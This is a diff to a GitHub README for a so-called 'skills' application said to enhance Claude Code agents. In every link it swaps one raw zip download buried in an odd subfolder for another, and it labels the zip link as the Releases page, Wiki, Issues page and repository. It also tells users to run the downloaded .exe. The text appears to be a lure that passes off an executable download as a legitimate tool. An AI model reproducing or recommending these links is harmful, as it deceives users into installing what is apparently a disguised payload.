@@ -1,10 +1,10 @@
 # 🎯 skills - Enhance Your Agent's Capabilities Effortlessly
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip)
+[![Download Latest Release](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip)
 
 ## 🚀 Getting Started
-Welcome to the skills application! This software is designed to help you enhance your agent's abilities for Claude Code and https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip agents. Follow the steps below to download and run the application.
+Welcome to the skills application! This software is designed to help you enhance your agent's abilities for Claude Code and https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip agents. Follow the steps below to download and run the application.
 
 ## 📋 System Requirements
 Before you proceed, ensure your system meets these basic requirements:
@@ -15,11 +15,11 @@ Before you proceed, ensure your system meets these basic requirements:
 
 ## 📂 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the latest version of the software.
-   - [Visit this page to download](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip)
+   - [Visit this page to download](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip)
    
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Look for the latest release, which contains the newest features and bug fixes.
 
-3. **Download the Installer:** Click on the version you want to download. You will see different files with descriptions. For most users, the executable file (e.g., `https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip` or `https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip`) is the best choice. 
+3. **Download the Installer:** Click on the version you want to download. You will see different files with descriptions. For most users, the executable file (e.g., `https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip` or `https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip`) is the best choice. 
 
 4. **Run the Installer:**
    - For **Windows:** Double-click the `.exe` file you downloaded. Follow the on-screen instructions to complete the installation.
@@ -42,8 +42,8 @@ After installation, you may want to configure your settings to get the most out 
 ## 💬 Help & Support
 If you encounter any issues or have questions, consider these resources for assistance:
 
-- **Documentation:** Visit our [GitHub Wiki](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip) for in-depth guides.
-- **Issues Page:** Report any bugs or request features on the [Issues page](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip).
+- **Documentation:** Visit our [GitHub Wiki](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip) for in-depth guides.
+- **Issues Page:** Report any bugs or request features on the [Issues page](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip).
 - **Community Forum:** Join discussions and get help from other users on our community forum linked in the documentation.
 
 ## 📣 Contributing
@@ -55,7 +55,7 @@ This project is licensed under the MIT License. You can use the software freely,
 ## 🌐 More Information
 For more detailed information about the application or updates, refer to the following links:
 
-- [Visit the Releases Page for Latest Updates](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip)
-- [Explore the GitHub Repository](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/web-typography/Software-1.3.zip)
+- [Visit the Releases Page for Latest Updates](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip)
+- [Explore the GitHub Repository](https://github.com/bilalmirza2001/skills/raw/refs/heads/main/drive-motivation/references/Software-v1.1.zip)
 
 Thank you for using skills! 
